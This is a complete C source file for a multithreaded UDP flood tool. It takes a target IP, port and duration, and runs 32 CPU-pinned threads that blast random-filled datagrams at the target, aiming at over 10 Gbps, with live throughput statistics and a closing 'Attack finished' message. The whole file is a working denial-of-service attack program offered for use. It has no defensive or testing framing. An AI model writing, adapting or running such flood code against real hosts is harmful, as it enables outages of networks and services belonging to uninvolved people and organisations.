#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define BUFFER_SIZE 1472  // MTU 1500 - IP/UDP headers
#define MAX_THREADS 32    // Optimized thread count
#define BATCH_SIZE 512    // Larger batches for better throughput
#define STATS_INTERVAL 1

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    int cpu_core;
    uint64_t packet_count;
    uint64_t total_bytes;
} flood_args_t;

volatile sig_atomic_t keep_running = 1;
volatile uint64_t global_packets = 0;
volatile uint64_t global_bytes = 0;
time_t global_start_time;

// Pre-initialized packet buffer
typedef struct {
    char data[BUFFER_SIZE];
} __attribute__((aligned(64))) packet_buffer_t;

// Memory for all threads
packet_buffer_t *global_buffers = NULL;

void handle_signal(int sig) {
    keep_running = 0;
    printf("\nShutting down gracefully...\n");
}

void set_cpu_affinity(int cpu_core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_core, &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np");
    }
}

void set_socket_high_priority(int sock) {
    int optval;
    
    // Maximum send buffer
    int sndbuf = 4 * 1024 * 1024;  // 4MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    // Reuse address
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    // Don't fragment
    int dontfrag = 1;
    setsockopt(sock, IPPROTO_IP, IP_MTU_DISCOVER, &dontfrag, sizeof(dontfrag));
    
    // Low priority to avoid system instability
    int priority = 0;
    setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
}

void init_packet_buffers() {
    // Allocate aligned memory for all threads
    global_buffers = aligned_alloc(64, MAX_THREADS * BATCH_SIZE * sizeof(packet_buffer_t));
    if (!global_buffers) {
        perror("aligned_alloc");
        exit(1);
    }
    
    // Lock memory to prevent swapping
    if (mlock(global_buffers, MAX_THREADS * BATCH_SIZE * sizeof(packet_buffer_t)) < 0) {
        perror("mlock");
    }
    
    // Initialize with random data from /dev/urandom
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (urandom) {
        for (int i = 0; i < MAX_THREADS * BATCH_SIZE; i++) {
            if (fread(global_buffers[i].data, BUFFER_SIZE, 1, urandom) != 1) {
                // Fallback to pseudo-random
                for (int j = 0; j < BUFFER_SIZE; j++) {
                    global_buffers[i].data[j] = rand() % 256;
                }
            }
        }
        fclose(urandom);
    } else {
        srand(time(NULL));
        for (int i = 0; i < MAX_THREADS * BATCH_SIZE; i++) {
            for (int j = 0; j < BUFFER_SIZE; j++) {
                global_buffers[i].data[j] = rand() % 256;
            }
        }
    }
}

void *stats_thread(void *arg) {
    set_cpu_affinity(0);
    time_t last_time = time(NULL);
    uint64_t last_packets = 0;
    uint64_t last_bytes = 0;
    
    printf("[STATS] Starting monitoring... Target: 10+ Gbps\n");
    printf("[STATS] Threads: %d, Packet Size: %d bytes, Batch Size: %d\n", 
           MAX_THREADS, BUFFER_SIZE, BATCH_SIZE);
    
    while (keep_running) {
        sleep(STATS_INTERVAL);
        time_t current_time = time(NULL);
        uint64_t current_packets = __atomic_load_n(&global_packets, __ATOMIC_RELAXED);
        uint64_t current_bytes = __atomic_load_n(&global_bytes, __ATOMIC_RELAXED);
        
        uint64_t interval_packets = current_packets - last_packets;
        uint64_t interval_bytes = current_bytes - last_bytes;
        double interval_seconds = difftime(current_time, last_time);
        
        if (interval_seconds > 0) {
            double pps = interval_packets / interval_seconds;
            double gbps = (interval_bytes * 8.0) / (interval_seconds * 1000000000);
            double total_gb = (double)current_bytes / (1000000000);
            double total_time = difftime(current_time, global_start_time);
            
            printf("[STATS] PPS: %.0f | Gbps: %.2f | Total: %.2f GB | Time: %.0fs\n", 
                   pps, gbps, total_gb, total_time);
            
            // Performance warning
            if (gbps < 8.0) {
                printf("[WARNING] Performance below target! Current: %.2f Gbps\n", gbps);
            }
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    return NULL;
}

void *udp_flood(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    int thread_id = flood_args->thread_id;
    int cpu_core = flood_args->cpu_core;
    
    set_cpu_affinity(cpu_core);
    
    // Create raw socket for maximum performance
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        free(args);
        return NULL;
    }

    set_socket_high_priority(sock);

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        free(args);
        return NULL;
    }

    // Connect socket to target for better performance
    if (connect(sock, (struct sockaddr*)&target, sizeof(target)) < 0) {
        perror("connect");
        // Continue anyway, it's not critical
    }

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    uint64_t thread_packets = 0;
    uint64_t thread_bytes = 0;
    
    printf("Thread %d started on CPU %d -> %s:%d\n", 
           thread_id, cpu_core, ip, port);

    // Get this thread's pre-allocated buffer segment
    packet_buffer_t *thread_buffers = &global_buffers[thread_id * BATCH_SIZE];
    
    // Main sending loop - optimized for throughput
    while (keep_running && time(NULL) < end_time) {
        for (int batch = 0; batch < 100; batch++) {  // Multiple batches per iteration
            for (int i = 0; i < BATCH_SIZE; i++) {
                ssize_t sent = send(sock, thread_buffers[i].data, BUFFER_SIZE, MSG_DONTWAIT);
                if (sent > 0) {
                    thread_packets++;
                    thread_bytes += sent;
                } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    // Socket buffer full, slight pause
                    usleep(1);
                }
            }
        }
        
        // Update global stats every few batches
        __atomic_fetch_add(&global_packets, thread_packets, __ATOMIC_RELAXED);
        __atomic_fetch_add(&global_bytes, thread_bytes, __ATOMIC_RELAXED);
        thread_packets = 0;
        thread_bytes = 0;
    }

    close(sock);
    printf("Thread %d finished\n", thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("High-Performance UDP Flood Tool - Target: 10+ Gbps\n");
        printf("Usage: %s <IP> <PORT> <DURATION_IN_SECONDS>\n", argv[0]);
        printf("Example: %s 192.168.1.100 80 60\n", argv[0]);
        return 1;
    }

    signal(SIGINT, handle_signal);
    global_start_time = time(NULL);

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    printf("Starting UDP flood to %s:%d for %d seconds\n", ip, port, duration);
    printf("Configuration: %d threads, %d bytes/packet, target: 10+ Gbps\n", 
           MAX_THREADS, BUFFER_SIZE);

    // Initialize global packet buffers
    init_packet_buffers();

    pthread_t threads[MAX_THREADS];
    pthread_t stats_tid;

    // Start stats thread
    pthread_create(&stats_tid, NULL, stats_thread, NULL);

    // Start flood threads with staggered startup
    for (int i = 0; i < MAX_THREADS; i++) {
        flood_args_t *args = malloc(sizeof(flood_args_t));
        strcpy(args->ip, ip);
        args->port = port;
        args->duration = duration;
        args->thread_id = i;
        args->cpu_core = i % sysconf(_SC_NPROCESSORS_ONLN);
        
        if (pthread_create(&threads[i], NULL, udp_flood, args) != 0) {
            perror("pthread_create");
            free(args);
            continue;
        }
        
        // Stagger thread startup to avoid burst
        usleep(1000);
    }

    printf("All %d threads started. Waiting for completion...\n", MAX_THREADS);

    // Wait for all threads
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    keep_running = 0;
    pthread_join(stats_tid, NULL);
    
    // Cleanup
    if (global_buffers) {
        free(global_buffers);
    }
    
    printf("Attack finished. Total packets: %lu, Total bytes: %lu\n", 
           global_packets, global_bytes);
    
    return 0;
}